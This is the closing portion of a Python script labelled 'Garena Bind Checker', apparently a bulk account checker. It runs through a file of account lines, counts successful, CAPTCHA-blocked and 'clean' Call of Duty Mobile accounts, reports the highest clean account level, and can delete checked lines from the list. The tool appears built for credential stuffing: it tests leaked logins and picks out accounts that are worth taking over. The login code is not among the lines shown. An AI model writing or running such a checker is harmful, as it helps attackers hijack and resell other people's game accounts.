        codm_status_table.add_row("Not Clean Accounts", str(not_clean_count), f"{not_clean_count/total_codm_accounts*100:.2f}%", style="yellow")
        console.print(codm_status_table)
        summary = f"\nTotal Successful: {successful_count}\nTotal Failed: {failed_count}\nTotal CAPTCHA: {captcha_count}\nTotal Errors: {error_count}\nTotal No CODM: {no_codm_count}\nTotal Clean: {clean_count}\nTotal Not Clean: {not_clean_count}\nHighest Clean CODM Level: {highest_clean_codm_level}"
        if auto_remove_lines:
            remaining_accounts_for_rewrite.extend(list(accounts_to_process))
            with open(input_file, 'w', encoding='utf-8') as infile_to_rewrite:
                for line in remaining_accounts_for_rewrite:
                    infile_to_rewrite.write(line + '\n')
            console.print(f"[green]Checked lines removed from {input_file}.[/green]")
        else:
            console.print(f"[yellow]Input file {input_file} was not modified.[/yellow]")
    except UnicodeEncodeError as e:
        console.print(f"[red]Error: Unable to write to output file. Please ensure the file path is valid and you have write permissions.[/red]")
    except Exception as e:
        console.print(f"[red]An unexpected error occurred: {str(e)}[/red]")

W = "\033[0m"
GR = "\033[90m"
R = "\033[1;31m"
RED = "\033[101m"
B = "\033[0;34m\033[1m"

def display_banner():
    print(f"{W}")
    print(f"{W}{W} [\033[1mTaji{W}] {GR}               :::!~!!!!!:.          {W}")
    print(f"{W}{GR}                  .xUHWH!! !!?M88WHX:.       {W}")
    print(f"{W}{GR}                .X*#M@$!!  !X!M$$$$WWx:     {W}")
    print(f"{W}{GR}               :!!!!!!?H! :!$$$$$$$$$$8X:  {W}")
    print(f"{W}{GR}             !!~  ~:~!! :~!%$$$$$$$$$$8X:  {W}")
    print(f"{W}{GR}             :!~::!H![   ~.U$X!?W$$$$$$$MM! {W}")
    print(f"{W}{GR}             ~!~!!!!~~ .:XW$$U!!?$$$$$$WMM! {W}")
    print(f"{W}{GR}               !:~~~ .:!M*T#$$$$WX??#MRRMMM! {W}")
    print(f"{W}{GR}               ~?WuxiW*     *#$$$$8!!!!??!!! {W}")
    print(f"{W}{GR}             :X- M$$$$  {R}  *{GR}  '#T#$T~!8$WUXU~ {W}")
    print(f"{W}{GR}          :%'  ~%$$Mm:         ~!~ ?$$$$$  {W}")
    print(f"{W}{GR}          :! .-   ~T$$$$8xx.  .xWW- ~””##*'' {W}")
    print(f"{W}{GR}  .....   -~~:<  !    ~?T$@@W@*?$$ {R} * {GR} /’   {W}")
    print(f"{W}{GR} W@@M!!! .!~~ !!     .:XUW$W!~ '*~:   :     {W}")
    print(f"{W}{GR} %^~~'.:x%'!!  !H:   !WM$$$$Ti.: .!WUnn!     {W}")
    print(f"{W}{GR} :::~:!. :X~ .: ?H.!u *$$$$$$!W:U!T$M~     {W}")
    print(f"{W}{GR} .~~   :X@!.-~   ?@WTWo('*$W$TH$!          {W}")
    print(f"{W}{GR} Wi.~!X$?!-~    : ?$$B$Wu(***$RM!           {W}")
    print(f"{W}{GR} $R@i.#~ !     :   -$$$$%Mm$;              {W}")
    print(f"{W}{GR} ?MXT@Wx.~    :     ~##$$$M~                {W}")
    print(f"{W} ")
    print(f"\033[1m{R}{W}{RED}{B}{W}{RED} Garena Bind Checker: by Taji {B}{W}{R}\033[0m")
    print()

def main_validation_and_run_checker():

        for i in range(3, 0, -1):
            print(f"\rStarting in {i}...", end="")
            time.sleep(1)

        clear_screen()
        
        display_banner()
        input_file = console.input(f"[magenta]-> ᴇɴᴛᴇʀ Fɪʟᴇɴᴀᴍᴇ ᴡɪʟʟ ᴄʜᴇᴄᴋ: [/magenta]")
        auto_remove_choice = console.input(f"[cyan]-> Do you want to automatically remove checked lines from the input file? (y/n): [/cyan]").strip().lower()
        auto_remove_lines = auto_remove_choice == 'y'

        if not os.path.exists(input_file):
            console.print(f"[red]-> Error: The input file does not exist. Please check the path and try again.[/red]")
        else:
            with open(input_file, 'r', encoding='utf-8') as f:
                total_lines = len([line for line in f if line.strip()])

            num_lines_to_check = None
            while True:
                num_lines_input = console.input(f"[magenta]-> Enter number of lines to check (1 - {total_lines}, leave blank for all): [/magenta]").strip()
                if not num_lines_input:
                    num_lines_to_check = None
                    break
                try:
                    num_lines_to_check = int(num_lines_input)
                    if 1 <= num_lines_to_check <= total_lines:
                        break
                    else:
                        console.print(f"[red]-> Invalid number. Please enter a value between 1 and {total_lines}.[/red]")
                except ValueError:
                    console.print(f"[red]-> Invalid input. Please enter a number.[/red]")

            bulk_check(input_file, auto_remove_lines=auto_remove_lines, num_lines_to_check=num_lines_to_check)

    

if __name__ == "__main__":
    try:
        main_validation_and_run_checker()
    except Exception as e:
        console.print(f"[red]An unexpected error occurred: {str(e)}[/red]")
    finally:
        if LOG_FILENAME: # Only print if LOG_FILENAME was actually set
            console.print(f"[green]Logging finalized. Check {LOG_FILENAME} for detailed logs.[/green]")

